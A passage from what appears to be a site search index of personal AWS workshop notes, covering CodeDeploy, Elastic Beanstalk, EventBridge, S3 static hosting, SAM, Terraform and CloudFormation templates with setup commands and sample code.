timeout: 300 runas: root ValidateService: - location: scripts/validate_service.sh timeout: 300 Rollbacks Developer Tools \u0026gt; CodeDeploy \u0026gt; Applications \u0026gt; CodeDeployDemo \u0026gt; MyProdInstances\nEdit: Rollbacks: Uncheck rollbacks\nRoll back when a deployment fails Roll back when alarm thresolds are met Create deployment alarm: go to CloudWatch and create an alarm\nAdd Alarms\nSelect Metrics\nCPUUtilization Creater than ..: 70 Select an existing SNS topic Default_CloudWatch_Alarms_Topic Alarm name: EC2Utilization\nCreate alarm\nAdd alarm : EC2Utilization\nRoll back when alarm thresolds are met Roll back when a deployment fails "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.3-computing/",
	"title": "Computing Solutions",
	"tags": [],
	"description": "",
	"content": "Business Request The school server that runs the scheduling solution needs more memory. Assist with vertically scaling their Amazon EC2 instance.\nLearning Objectives Describe Amazon EC2 instance families and instance types. Describe horizontal and vertical scaling. Recognize options for connecting to Amazon EC2 instances. "
},
{
	"uri": "http://localhost:1313/aws-ws/3-config/",
	"title": "Configuration",
	"tags": [],
	"description": "",
	"content": " Infrastructure as Code (IAC): IAC is the practice of managing and provisioning computing infrastructure through machine-readable definition files, rather than physical hardware configuration or interactive configuration tools. It allows you to automate the process of setting up and managing your infrastructure.\nContinuous Integration/Continuous Deployment (CI/CD): CI/CD is a set of practices and tools that enable development teams to automate the process of integrating code changes into a shared repository (Continuous Integration) and then automatically deploying those changes to production or other environments (Continuous Deployment). This helps teams deliver code changes more frequently, reliably, and efficiently.\nFollow the content bellow :\nContent IaC CICD "
},
{
	"uri": "http://localhost:1313/aws-ws/13-ha/13.3-bean/",
	"title": "Elastic Beanstalk",
	"tags": [],
	"description": "",
	"content": "Best Practices IAM : Policies: ElasticBeanstalk-Instance-Policy Roles: ElasticBeanstalk-Instance-Role AWS Service \u0026gt; Use case: EC2 Policies: ElasticBeanstalk-Instance-Policy Compute \u0026gt; Elastic Beanstalk \u0026gt; Create Application Configure environment Environment tier \u0026gt; Web server environment Application name: demoapp Environment name: Demoapp-env Domain: demoapp \u0026gt; Check availability Platform: Python Application code: Sample application Configuration presets: Single instance (free tier eligble) NEXT Configure service access Service access: Existing service roles: aws-elasticbeanstalk-service-Role EC2 instance profile: aws-elasticbeanstalk-Instance-Role Configure instance traffic and scaling VPC: 172.31.0.0/16 (default) Instance subnets: 172.31.0.0/20 - us-east-1a 172.31.80.0/20 - us-east-1b NEXT Instances Volumes: SSD Size: 8 GB CloudWatch monitor: 5 minutes IMDS: Check Deactivated Security Groups: default Auto scaling group: Single instance Feet composition: On-Demand instance NEXT Configure updates, monitoring, and logging System: Basic Managed updates: Uncheck Adtivated NEXT SUBMIT Review Host Apps in the Cloud Manage both infrastructure and application Use a managed service to handle the infrastructure so developers can focus on the application "
},
{
	"uri": "http://localhost:1313/aws-ws/12-automate/12.3-event/",
	"title": "Event-driven architecture",
	"tags": [],
	"description": "",
	"content": "Event-driven architecture In an event-driven architecture, changes within the environment trigger code execution or initiation of workflows. Event-driven architecture creates loosely coupled, resilient, and scalable infrastructure. You can configure EventBridge to detect EC2 instance termination events. Upon detection, EventBridge can notify an SNS topic and trigger a Lambda function to launch a replacement instance\nYou can configure EventBridge to detect S3 object upload events. Upon detection, EventBridge can trigger a Lambda function to process the uploaded object.\nDemo\nAmazon EventBridge - Create rule\nDefine rule detail :\nName: process-s3-objects-with-lambda Event bus: default Rule type: Rule with an event pattern NEXT Build event pattern\nEvent source AWS events Sampe event - optional Event pattern AWS service S3 Event type: Amazon S3 Event Notification Event type specification 1 Specific event(s) Object Created Event type specification 2 Specific event(s) processing-bucket-1 Select target(s) Target 1 Target types Select a target: Lambda function Function: Do_nothing Target 2 Target types Select a target: SNS topic Topic : Topic1 NEXT Configure tags - NEXT - CREATE rule The rule has been created and it will be invoked each time an object is uploaded to the specified bucket. The rule will then forward the event to the configured targets, the Lambda function and the SNS topic. This rule is based on an event pattern.\nYou can also create a schedule rule. Let\u0026rsquo;s say we need to start an EC2 instance, which is a batch-processing server, at 11 p.m. every night and stop it the following morning at 6 a.m\nSchedules:\nSpecfify schedule detail Schedule name: Start_batch_server_11PM -\u0026gt; NEXT Select target All APIs - Amazone EC2 \u0026gt; Startinstances Provice instance IDs Settings Action after schedule completion: NONE DLQ - Retry policy: Turn off Retry Permissions - Select an existing role: EventBridge_EC2_Startinstance_Role NEXT - CREATE SCHEDULE "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.1-compute/5.1.3-practice/",
	"title": "Practice",
	"tags": [],
	"description": "",
	"content": "Concept In this practice lab, you will:\nReview a bucket policy to secure a bucket in Amazone S3 Enable static website hosting. Practice Lab The AWS Management Console is a web interface to access and manage the broad collection of services provided by Amazon Web Services (AWS).\nStep 5:\nIn the top navigation bar search box, type: s3 In the search results, under Services, click S3. Go to the next step. Amazon Simple Storage Service (Amazon S3) is an object storage service that offers industry-leading scalability, data availability, security, and performance. Customers of all sizes and industries can use Amazon S3 to store and protect any amount of data for range of use cases, such as data lakes, websites, mobile applications, backup and restore, archive, enterprise applications, IoT devices, and big data analytics.\nStep 6:\nOn the General purpose buckets tab, click the bucket name that starts with website-bucket-.\nThe bucket name that starts with website-bucket- contains code required for this lab. Go to the next step. A bucket is a container for objects stored in Amazon S3. Every objects is contained in a bucket. Amazon S3 offers a range of storage classes for the objects that you store. You chose a class depending on your use case scenario and performance access requirements. Amazon S3 provides storage classes for frequently accessed infrequently accessed, and archive access objects.\nStep 7\nAt the top of the page, select (highlight) and copy the bucket name, and then paste it in the text editor of your choice on your device.\nYou must use this bucket name in the later DIY section of this solution. On the Objects tab, review the objects in the bucket.\nFive files should be displayed. These files contain the contents of the static webpage. Local files can be loaded into this S3 bucket by using the Upload button. Choose the check box to select text.html.\nClick Actions to expand the dropdown menu.\nChoose Rename object.\nGo to the next step. You can choose the georaphical AWS Region where Amazon S3 stores the buckets that you create. You might choose a Region to optimize latency, minimize costs, or address regulatory requirements. Objects stored in an AWS Region never leave the Region unless you explicity transfer or replicate them to another Region. For excample, objects stored in the Euro (Ireland) Region never leave it. Howerver, Amazon S3 redundantly stores objects on multiple devices across a minimun of three Availability Zones in an AWS Region. An Availability Zone is one or more discreate data centers with redundant power, networking, and connectivity in an AWS Region\nStep 8\nFor New object name, type: error.html\nThis file contains the code for the error page, which opens whenever something goes wrong. Click Save changes.\nGo to the next step.\nUsing Amazone S3, you can upload objects up to 5 GB in size with a single PUT operation. For larger objects, upteo 5 TB in size, use the multipart upload API.\nStep 9\nIn the success alert, review the message. Click the Permissions tab. Go to the next step. By default, all Amazone S3 resources (buckets, objects, and related subresources) are private. Only the resource owner can access them. The resource owner can optionally grant access permissons to others by writing an access policy.\nStep 10\nIn the Block public access (bucket settings) section, review to ensure that Block all public access is set to Off. Turning off \u0026ldquo;Block all public access\u0026rdquo; is necessary for static web hosting through your S3 bucket. Scroll down to Bucket policy. Go to the next step. You can grant permissions to your Amazon S3 resources through bucket policies and user policies. Both options use JSON-based access policy language. An Amazon Resource Name (ARN) uniquely identifies AWS resources.\nStep 11\nIn the Bucket policy editor window, review the policy.\nThis policy allows public access to the S3 bucket. Effect says this policy will Allow access. Principal defines who has access. In this case, * represents anyone. Action defines what users can do to objects in the bucket. In this case, users can only retrieve data with GetObject. Resource specifies that this policy applies to only this bucket. Generally, to safeguard against unintentional data exposure, we recommend strict S3 bucket permissions in production. Scroll up to the top of the page.\nGo to the next step.\nTo host a static website on Amazon S3, configure your bucket for static website hosting, set permissions, and add an index document. Available options include redirects, loging, and error documents.\nStep 12\nClick the Properties tab. Go to the next step. Step 13\nScroll down to Static website hosting. Click Edit. Go to the next step. Amazon S3 supports virtual-hosted-style URLs and path-style URLs. A virual-hosted-style URL locks like: https://bucket-name.s3.Region.amazonaws.com/key. A path-style URL looks like: https://s3.Region.amazonaws.com/bucket-nam/keyname.\nStep 14\nFor Static website hosting, choose Enable. For Hosting type, choose Host a static website. For Index document, type: index.html For Error document, type: error.html Go to the next step. Step 15\nScroll down to the bottom of the page. Click Save changes. Go to the next step. Step 16\nScroll down to Static website hosting. Review to ensure that Hosting type is set to Bucket hosting. Under Bucket website endpoint, click the copy icon to copy the provided endpoint. Go to the next step. Step 17\nTo load the Beach Wave Conditions webpage, in a new browser tab (or window) address bar, paste the bucket website endpoint that you just copied, and then press Enter. Go to the next step. Finish\n"
},
{
	"uri": "http://localhost:1313/aws-ws/7-fcj/7.3-sam/",
	"title": "SAM",
	"tags": [],
	"description": "",
	"content": "AWS Serverless Application Model Source: Learning Amazon Web Services Lambda (Is processing)\nGithub: https://github.com/LinkedInLearning/learning-amazon-web-services-lambda-4411402\nChallenge:\n- - Solution:\nCreate funtions: RollADiceWithSidesFunction Create folder: roll-dice-sides/app.mjs Start local: sam build sam local start-api Running on http://127.0.0.1:3000 curl http://localhost:3000/roll curl http://localhost:3000/roll?sides=4 curl http://localhost:3000/roll?sides=20 Deploy to the Cloud sam deploy \u0026ndash;guild (or use samconfig.toml: same deploy) - - CloudFormation check - - Source: https://github.com/LinkedInLearning/learning-amazon-web-services-lambda-4411402/tree/05_05/sam-first-project\napp.mjs\rexport const lambdaHandler = async (event) =\u0026gt; { console.log(\u0026#39;Roll dice with sides run\u0026#39;); let sides = 6; if (event.queryStringParameters \u0026amp;\u0026amp; event.queryStringParameters.sides) { sides = event.queryStringParameters.sides; } const result = rollDice(sides); const message = `The result is ${result}, you rolled a dice of ${sides} sides.`; try { return { statusCode: 200, body: JSON.stringify({ message: message, }), }; } catch (err) { console.log(err); return err; } }; function rollDice(sides) { const randomNumber = Math.floor(Math.random() * sides) + 1; return randomNumber; } templete.yaml\rAWSTemplateFormatVersion: \u0026#39;2010-09-09\u0026#39; Transform: AWS::Serverless-2016-10-31 Description: \u0026gt; sam-first-project Sample SAM Template for sam-first-project # More info about Globals: https://github.com/awslabs/serverless-application-model/blob/master/docs/globals.rst Globals: Function: Timeout: 3 Resources: HelloWorldFunction: Type: AWS::Serverless::Function # More info about Function Resource: https://github.com/awslabs/serverless-application-model/blob/master/versions/2016-10-31.md#awsserverlessfunction Properties: CodeUri: hello-world/ Handler: app.lambdaHandler Runtime: nodejs18.x Architectures: - x86_64 Events: HelloWorld: Type: Api # More info about API Event Source: https://github.com/awslabs/serverless-application-model/blob/master/versions/2016-10-31.md#api Properties: Path: /hello Method: get RollADiceFunction: Type: AWS::Serverless::Function Properties: CodeUri: roll-dice/ Handler: app.lambdaHandler Runtime: nodejs18.x Events: RollDiceApi: Type: Api Properties: Path: /dice Method: get RollADiceWithSidesFunction: Type: AWS::Serverless::Function Properties: CodeUri: roll-dice-sides/ Handler: app.lambdaHandler Runtime: nodejs18.x Events: RollDiceSideApi: Type: Api Properties: Method: get Path: /roll Outputs: # ServerlessRestApi is an implicit API created out of Events key under Serverless::Function # Find out more about other implicit resources you can reference within SAM # https://github.com/awslabs/serverless-application-model/blob/master/docs/internals/generated_resources.rst#api HelloWorldApi: Description: \u0026#39;API Gateway endpoint URL for Prod stage for Hello World function\u0026#39; Value: !Sub \u0026#39;https://${ServerlessRestApi}.execute-api.${AWS::Region}.amazonaws.com/Prod/hello/\u0026#39; HelloWorldFunction: Description: \u0026#39;Hello World Lambda Function ARN\u0026#39; Value: !GetAtt HelloWorldFunction.Arn HelloWorldFunctionIamRole: Description: \u0026#39;Implicit IAM Role created for Hello World function\u0026#39; Value: !GetAtt HelloWorldFunctionRole.Arn Overview IAC\rCloudWatch - Install and configure AWS SAM Install AWS CLI\naws \u0026ndash;version sam \u0026ndash;version Create an AWS SAM Project\nsam init Configure\rMACOS sam-first-project 1 - AWS Quick Start Templates 1 - Hello World Example 11 - nodejs18.x 1 - Zip 2 - Hello World Example TypeScript No - X-RAY No - CloudWatch Project name: sam-first-project ls : sam-first-project\ncd sam-first-project\ncode .\nLambda functions with AWS SAM sam-first-project sam build -\u0026gt; .aws-sam sam local invoke HelloWorldFunction \u0026ndash;event events/event.json change name and rebuild to check sam local start-api Testing Expand\rAWS SAM - Funtion and API gateway with SAM Create funtions: RollADiceFuntion Create folder : roll-dice create file /roll-dice/app.mjs Build template: sam build Run funtions: sam local invoke RollADiceFuntion \u0026ndash;event events/event.json Expand\rFuntions - Deploy your AWS SAM project to the cloud sam build\nsam deploy \u0026ndash;guided\nCloudFormation check\nCheck template.yaml output\nCheck API\nTest with Postman\nSee funtion metric and logs : sam logs \u0026ndash;name:RollADiceFunction \u0026ndash;stack-name same-first-project \u0026ndash;region eu-west-1 \u0026ndash;tail\nCheck samconfig.toml\nExcute Postman test\nCheck Sam logs again\nExpand\rBuild Deploy - "
},
{
	"uri": "http://localhost:1313/aws-ws/2-prepair/2.3-terraform/",
	"title": "Terraform",
	"tags": [],
	"description": "",
	"content": "Terraform is a open-source tool used to build, modify, and version control infratrucrure\nOverview Provider(provider.tf): Enables Terrafrom to interact with cloud providers and other APIs Terraform (versions.tf): Sets version constaints for Terraform and optionally maps provides to a source address and version constaint Variables (variable.tf): Input variables define reusable values and work like function arguments in general-purpose programming languages Resource (main.tf): Resource blocks describe infrastructure objects like VPCs, subnets, route tables, and gateways Data : Data sources allow Terraform to ultilize information form resources that were defined outside of Terraform (or defined a different Terraform configuration) Output: Outputs return structured data form your configuration and work like return values in generaral-purpose programming languages Terraform.tfvars: To set lots of variables, it is more convenient to specify their values in a variable definitions file Command terraform init [options]: command initializes a working directory containing Terraform configuration files. terraform plan [options]: command creates an execution plan, which lets you preview the changes that Terraform plans to make to your infrastructure. terraform apply [options] [plan file]: command executes the actions proposed in a Terraform plan terraform destroy [options]: command is a convenient way to destroy all remote objects managed by a particular Terraform configuration. Run Terraform in containter: Run docker compose:\ndocker-compose run --rm terraform version Run configure:\nProvider (AWS): versions.tf\nterraform { required_providers { aws = { source = \u0026#34;hashicorp/aws\u0026#34; version = \u0026#34;~\u0026gt; 4.16\u0026#34; } } required_version = \u0026#34;\u0026gt;= 1.2.0\u0026#34; } Security credential variables: variables.tf\nvariable \u0026#34;access_key\u0026#34; { type = string sensitive = true } variable \u0026#34;secret_key\u0026#34; { type = string sensitive = true } variable \u0026#34;region\u0026#34; { type = string default = \u0026#34;ap-southeast-1\u0026#34; } Terraform init:\ndocker-compose run --rm terraform init "
},
{
	"uri": "http://localhost:1313/aws-ws/13-ha/13.4-fargate/",
	"title": "AWS Fargate",
	"tags": [],
	"description": "",
	"content": "\nAmazon Elastic Container (ECS) is a container management service. Fargate task do not share the underlying kernel, CPU, memory, or elastic network interface Each Fargate task runs in its own isolated boundary "
},
{
	"uri": "http://localhost:1313/aws-ws/5-cloudquest/5.4-ceconomics/",
	"title": "Cloud Economics",
	"tags": [],
	"description": "",
	"content": "Business Request The city\u0026rsquo;s surf board shop needs a cost estimation of an architecture with variable resource usage.\nLearning Objectives Describe how pricing estimates are obtained. Use the AWS Pricing Calculator to estimate the price of an AWS architecture. "
},
{
	"uri": "http://localhost:1313/aws-ws/7-fcj/7.4-cf/",
	"title": "CloudFormation",
	"tags": [],
	"description": "",
	"content": "LinkedIn Source: AWS: Deployment, Provisioning, and Automation\nWrite a CF template: single_instance.yaml Expand code here\r--- AWSTemplateFormatVersion: \u0026#39;2010-09-09\u0026#39; Description: A test stack for demonstrating Cloudformation Parameters: Subnet: Description: Subnet in which to place the resources Type: AWS::EC2::Subnet::Id IamInstanceProfile: Description: IAM profile for instance Type: String SecurityGroup: Description: This group will be applied to both the ELB and instances in the ASG Type: AWS::EC2::SecurityGroup::Id InstanceType: Description: The instance type for the Launch Config Type: String Default: t2.micro AllowedValues: - t2.nano - t2.micro - t2.small - t2.medium - t2.large Resources: MyInstance: Type: AWS::EC2::Instance Properties: UserData: Fn::Base64: !Sub | #!/bin/bash -xe sudo amazon-linux-extras install nginx1 -y sudo service nginx start ImageId: ami-087c17d1fe0178315 InstanceType: Ref: InstanceType SecurityGroupIds: - Ref: SecurityGroup SubnetId: Ref: Subnet IamInstanceProfile: Ref: IamInstanceProfile Running a CF template\nCloudFormation \u0026gt; Stacks \u0026gt; Create Stack\nTemplate is ready \u0026gt; Upload a template file : single-instance.yaml Stack name: WebServer IamInstallRole: SSMInstanceRole InstanceType: t3.micro SecurityGroup: (AllowHTTPFromWorld) Subnet: (172.31.32.0/20) Stack options: Tags: Name - Nginx Stack failure options: Roll back all stack resources NEXT \u0026gt; CREATE STACK Check :\nEvents Instances: Updating a CF Stack (change sets) Template: instanceandsecuritygroup.yml . Check code here\rDescription: \u0026gt; Template for creating a single ec2 instance and an attached security group. Also allows you to specify existing security groups to attach. Parameters: InstanceName: Description: The name tag for the instance Type: String VPC: Type: AWS::EC2::VPC::Id Description: Choose which VPC the security group should be deployed to Subnet: Description: The subnet in which to deploy the instance Type: AWS::EC2::Subnet::Id Contact: Description: Contact email Default: foo@bar.com Type: String Keyname: Description: Key to provision for SSHing into the ec2 instance Type: AWS::EC2::KeyPair::KeyName InstanceAMI: Description: AMI for the instance Type: String InstanceType: Description: what instance type the ec2 instance should use Default: t2.nano AllowedValues: - t2.nano - t2.micro - t2.small Type: String Resources: MySecurityGroup: Type: AWS::EC2::SecurityGroup Properties: GroupDescription: Allow world SSH access to this instance. VpcId: !Ref VPC SecurityGroupIngress: - IpProtocol: tcp FromPort: \u0026#39;443\u0026#39; ToPort: \u0026#39;443\u0026#39; CidrIp: 0.0.0.0/0 MyInstance: Type: AWS::EC2::Instance Properties: ImageId: Ref: InstanceAMI InstanceType: Ref: InstanceType SecurityGroupIds: - Ref: MySecurityGroup KeyName: Ref: Keyname SubnetId: Ref: Subnet Tags: - Key: Contact Value: !Ref Contact - Key: Name Value: !Ref InstanceName Outputs: InstanceID: Description: The Instance ID Value: !Ref MyInstance CloudFormation \u0026gt; Stacks \u0026gt; Create stack \u0026gt; With new resources (standard) Template is ready \u0026gt; Upload a template file : instance-and-security-group.yml Stack name: InstanceAndSecurityGroup InstanceAMI: amo-01cc\u0026hellip; (Check AMI) InstanceName: AmazonLinuxInstance InstanceType: t2.nano Keyname: demo-key Subnet: 172.31.32.0/20 VPC: 172.31.0.0/16 (defaultVPC) NEXT \u0026gt; CREATE STACK Update Stack Stack name: InstanceAndSecurityGroup Stack actions: Create change set for current stack Use current template \u0026gt; Change InstanceAMI Create change set Change set name: OperatingSystemChange Create change set Execute change set / Roll back Custom resources in CF IAM Role - Role name: LambdaS3FullAccessRole\nPermissions: AmazonS3FullAccess custom-resource-demo.yml check code here\rDescription: \u0026gt; Simple custom resource demo Parameters: InputMessage: Type: String Description: An input to the custom resource Default: Hello function! RoleForLambda: Description: ARN of the role you created Type: String Resources: MyCustomResourceFunction: Type: AWS::Lambda::Function Properties: Code: ZipFile: | var response = require(\u0026#39;cfn-response\u0026#39;); var aws = require(\u0026#34;aws-sdk\u0026#34;); exports.handler = function(event, context) { var input = event.ResourceProperties.InputParameter; var responseData = {msg: \u0026#34;hello world!\u0026#34;, msg2: input + \u0026#34; --received from caller\u0026#34;}; response.send(event, context, response.SUCCESS, responseData); }; Handler: index.handler Timeout: 30 Runtime: nodejs14.x Role: !Ref RoleForLambda MyCustomResourceCallout: Type: Custom::LambdaCallout Properties: ServiceToken: !GetAtt MyCustomResourceFunction.Arn InputParameter: !Ref InputMessage Outputs: OutputFromFunction: Description: Output from the custom function Value: !GetAtt MyCustomResourceCallout.msg ModifiedInputReturned: Description: Pipe out the input so we know we got it Value: !GetAtt MyCustomResourceCallout.msg2 CloudFormation \u0026gt; Stacks \u0026gt; Create stack \u0026gt; With new resources (standard)\n\u0026hellip;\nFCJ Source: https://000037.awsstudygroup.com/\nPrepairation IAM - Users: CloudFormation-user Permissions: AdministratorAccess Key: Name - Value: Admin User Download Access Key ID \u0026amp; Secret key IAM - Roles: CloudFormation-Role AWS Service EC2 Permission: AdministratorAccess Basic CloudFormation 2.1 Workspace\nCloud9: ASG-Cloud9-Workshop\nNew EC2 Instances Instance type: t2.micro Platform: Amazon Linux 2 Timeout 30 Minutes Network settings: Connection: SSM VPC: cloudformation-vpc Subnet: public-subnet-1 CREATE Instances: aws-cloud9-\u0026hellip;\nSecurity \u0026gt; Modify IAM role \u0026gt; IAM Role: CloudFormation-Role -\u0026gt; Update IAM Role Cloud9 Interface\nAWS settings - Credentials - Uncheck AWS managed temporary credentials Workspace\nInstall support tools sudo yum -y install jq gettext bash-completion moreutils (support text command) pip install cfn-lint (check CF yaml/json template) cfn-lint \u0026ndash;version pip install taskcat Configure AWS CLI export ACCOUNT_ID=$(aws sts get-caller-identity --output text --query Account) export AWS_REGION=$(curl -s 169.254.169.254/latest/dynamic/instance-identity/document | jq -r \u0026#39;.region\u0026#39;) export AZS=($(aws ec2 describe-availability-zones --query \u0026#39;AvailabilityZones[].ZoneName\u0026#39; --output text --region $AWS_REGION)) Save to bash_profile echo \u0026#34;export ACCOUNT_ID=$ACCOUNT_ID\u0026#34; | tee -a ~/.bash_profile echo \u0026#34;export AWS_REGION=$AWS_REGION\u0026#34; | tee -a ~/.bash_profile echo \u0026#34;export AZS=${AZS[@]}\u0026#34; | tee -a ~/.bash_profile aws configure set default.region $AWS_REGION aws configure get default.region Check IAM Role aws sts get-caller-identity --query Arn | grep CloudFormation-Role -q \u0026amp;\u0026amp; echo \u0026#34;IAM role valid\u0026#34; || echo \u0026#34;IAM role NOT valid\u0026#34; 2.2 CloudFormation Template\nAWS CLoud 9 \u0026gt; File \u0026gt; New File : singleec2instance.yaml Parameters AWSTemplateFormatVersion: \u0026#34;2010-09-09\u0026#34; Description: \u0026#34;Deploy Single EC2 Linux Instance as part of MGT312 Workshop\u0026#34; Parameters: EC2InstanceType: AllowedValues: - t3.nano - t3.micro - t3.small - t3.medium - t3.large - t3.xlarge - t3.2xlarge - m5.large - m5.xlarge - m5.2xlarge Default: t3.small Description: Amazon EC2 instance type Type: String LatestAmiId: Type: \u0026#39;AWS::SSM::Parameter::Value\u0026lt;AWS::EC2::Image::Id\u0026gt;\u0026#39; Default: \u0026#34;/aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-gp2\u0026#34; SubnetID: Description: ID of a Subnet. Type: AWS::EC2::Subnet::Id SourceLocation: Description : The CIDR IP address range that can be used to RDP to the EC2 instances Type: String MinLength: 9 MaxLength: 18 Default: 0.0.0.0/0 AllowedPattern: \u0026#34;(\\\\d{1,3})\\\\.(\\\\d{1,3})\\\\.(\\\\d{1,3})\\\\.(\\\\d{1,3})/(\\\\d{1,2})\u0026#34; ConstraintDescription: must be a valid IP CIDR range of the form x.x.x.x/x. VPCID: Description: ID of the target VPC (e.g., vpc-0343606e). Type: AWS::EC2::VPC::Id Resource: Security Group Resources: EC2InstanceSG: Type: AWS::EC2::SecurityGroup Properties: GroupDescription: EC2 Instance Security Group VpcId: !Ref \u0026#39;VPCID\u0026#39; SecurityGroupIngress: - IpProtocol: tcp FromPort: 80 ToPort: 80 CidrIp: !Ref SourceLocation Resource: Instance Role SSMInstanceRole: Type : AWS::IAM::Role Properties: Policies: - PolicyDocument: Version: \u0026#39;2012-10-17\u0026#39; Statement: - Action: - s3:GetObject Resource: - !Sub \u0026#39;arn:aws:s3:::aws-ssm-${AWS::Region}/*\u0026#39; - !Sub \u0026#39;arn:aws:s3:::aws-windows-downloads-${AWS::Region}/*\u0026#39; - !Sub \u0026#39;arn:aws:s3:::amazon-ssm-${AWS::Region}/*\u0026#39; - !Sub \u0026#39;arn:aws:s3:::amazon-ssm-packages-${AWS::Region}/*\u0026#39; - !Sub \u0026#39;arn:aws:s3:::${AWS::Region}-birdwatcher-prod/*\u0026#39; - !Sub \u0026#39;arn:aws:s3:::patch-baseline-snapshot-${AWS::Region}/*\u0026#39; Effect: Allow PolicyName: ssm-custom-s3-policy Path: / ManagedPolicyArns: - !Sub \u0026#39;arn:${AWS::Partition}:iam::aws:policy/AmazonSSMManagedInstanceCore\u0026#39; - !Sub \u0026#39;arn:${AWS::Partition}:iam::aws:policy/CloudWatchAgentServerPolicy\u0026#39; AssumeRolePolicyDocument: Version: \u0026#34;2012-10-17\u0026#34; Statement: - Effect: \u0026#34;Allow\u0026#34; Principal: Service: - \u0026#34;ec2.amazonaws.com\u0026#34; - \u0026#34;ssm.amazonaws.com\u0026#34; Action: \u0026#34;sts:AssumeRole\u0026#34; SSMInstanceProfile: Type: \u0026#34;AWS::IAM::InstanceProfile\u0026#34; Properties: Roles: - !Ref SSMInstanceRole Resource: EC2 instance Resources: EC2InstanceSG: Type: AWS::EC2::SecurityGroup Properties: GroupDescription: EC2 Instance Security Group VpcId: !Ref \u0026#39;VPCID\u0026#39; SecurityGroupIngress: - IpProtocol: tcp FromPort: 80 ToPort: 80 CidrIp: !Ref SourceLocation Outputs Outputs: EC2InstancePrivateIP: Value: !GetAtt \u0026#39;EC2Instance.PrivateIp\u0026#39; Description: Private IP for EC2 Instances Check location: /home/ec2-user-environment Check validate with cfn-lini: cfn-lint singleec2instance.yaml Create CloudFormation Stack: Update role : CloudFormation-Role Attach policies: AmazonEC2FullAccess vs IAMFullAccess Repair VPC \u0026amp; Public Subnet VPCs: cloudformation-vpc 10.0.0.0/16 \u0026gt; VPCID Subnet: cloudformation-subnet-public 10.0.0.0/20 \u0026gt; SubnetID Cloud9 run command: aws cloudformation create-stack --stack-name asg-cloudformation-stack --template-body file://singleec2instance.yaml --parameters ParameterKey=SubnetID,ParameterValue=subnet-04c111ad3987c5350 ParameterKey=VPCID,ParameterValue=vpc-0e3f81c05d3920198 --capabilities CAPABILITY_IAM --region us-east-1 Check CF template CloudFormation - Stacks - Stack details Events Resources Parameters Outputs Check Instances EC2 - Instances - Details CF Advanced CF 3.1 Create Lambda Function\nIAM Role: AWS Service - Use case: Lambda Create Policy \u0026gt; Name: ssh-key-policy \u0026gt; Create Policy { \u0026#34;Version\u0026#34;: \u0026#34;2012-10-17\u0026#34;, \u0026#34;Statement\u0026#34;: [ { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;logs:CreateLogGroup\u0026#34;, \u0026#34;logs:CreateLogStream\u0026#34;, \u0026#34;logs:PutLogEvents\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;arn:aws:logs:*:*:*\u0026#34; }, { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;ec2:CreateKeyPair\u0026#34;, \u0026#34;ec2:DescribeKeyPairs\u0026#34;, \u0026#34;ssm:PutParameter\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; }, { \u0026#34;Effect\u0026#34;: \u0026#34;Allow\u0026#34;, \u0026#34;Action\u0026#34;: [ \u0026#34;ec2:DeleteKeyPair\u0026#34;, \u0026#34;ssm:DeleteParameter\u0026#34; ], \u0026#34;Resource\u0026#34;: \u0026#34;*\u0026#34; } ] } Role name: ssh-key-gen-role \u0026gt; Create role AWS Lambda \u0026gt; Create function Author from scratch\nFuntion name: ssh-key-gen\nRuntime: Python 3.9\nArchiteture: x86_64\nExcution role \u0026gt; Use an existing role: ssh-key-gen-role\nCREATE FUNTION Input code below\r\u0026#34;\u0026#34;\u0026#34; This lambda implements the custom resource handler for creating an SSH key and storing in in SSM parameter store. e.g. SSHKeyCR: Type: Custom::CreateSSHKey Version: \u0026#34;1.0\u0026#34; Properties: ServiceToken: !Ref FunctionArn KeyName: MyKey An SSH key called MyKey will be created. \u0026#34;\u0026#34;\u0026#34; from json import dumps import sys import traceback import urllib.request import boto3 def log_exception(): \u0026#34;Log a stack trace\u0026#34; exc_type, exc_value, exc_traceback = sys.exc_info() print(repr(traceback.format_exception( exc_type, exc_value, exc_traceback))) def send_response(event, context, response): \u0026#34;Send a response to CloudFormation to handle the custom resource lifecycle\u0026#34; responseBody = { \u0026#39;Status\u0026#39;: response, \u0026#39;Reason\u0026#39;: \u0026#39;See details in CloudWatch Log Stream: \u0026#39; + \\ context.log_stream_name, \u0026#39;PhysicalResourceId\u0026#39;: context.log_stream_name, \u0026#39;StackId\u0026#39;: event[\u0026#39;StackId\u0026#39;], \u0026#39;RequestId\u0026#39;: event[\u0026#39;RequestId\u0026#39;], \u0026#39;LogicalResourceId\u0026#39;: event[\u0026#39;LogicalResourceId\u0026#39;], } print(\u0026#39;RESPONSE BODY: \\n\u0026#39; + dumps(responseBody)) data = dumps(responseBody).encode(\u0026#39;utf-8\u0026#39;) req = urllib.request.Request( event[\u0026#39;ResponseURL\u0026#39;], data, headers={\u0026#39;Content-Length\u0026#39;: len(data), \u0026#39;Content-Type\u0026#39;: \u0026#39;\u0026#39;}) req.get_method = lambda: \u0026#39;PUT\u0026#39; try: with urllib.request.urlopen(req) as response: print(f\u0026#39;response.status: {response.status}, \u0026#39; + f\u0026#39;response.reason: {response.reason}\u0026#39;) print(\u0026#39;response from cfn: \u0026#39; + response.read().decode(\u0026#39;utf-8\u0026#39;)) except urllib.error.URLError: log_exception() raise Exception(\u0026#39;Received non-200 response while sending \u0026#39; +\\ \u0026#39;response to AWS CloudFormation\u0026#39;) return True def custom_resource_handler(event, context): \u0026#39;\u0026#39;\u0026#39; This function creates a PEM key, commits it as a key pair in EC2, and stores it, encrypted, in SSM. To retrieve the key with currect RSA format, you must use the command line: aws ssm get-parameter \\ --name \u0026lt;KEYNAME\u0026gt; \\ --with-decryption \\ --region \u0026lt;REGION\u0026gt; \\ --output text Copy the values from (and including) -----BEGIN RSA PRIVATE KEY----- to -----END RSA PRIVATE KEY----- into a file. To use it, change the permissions to 600 Ensure to bundle the necessary packages into the zip stored in S3 \u0026#39;\u0026#39;\u0026#39; print(\u0026#34;Event JSON: \\n\u0026#34; + dumps(event)) # session = boto3.session.Session() # region = session.region_name # Original # pem_key_name = os.environ[\u0026#39;KEY_NAME\u0026#39;] 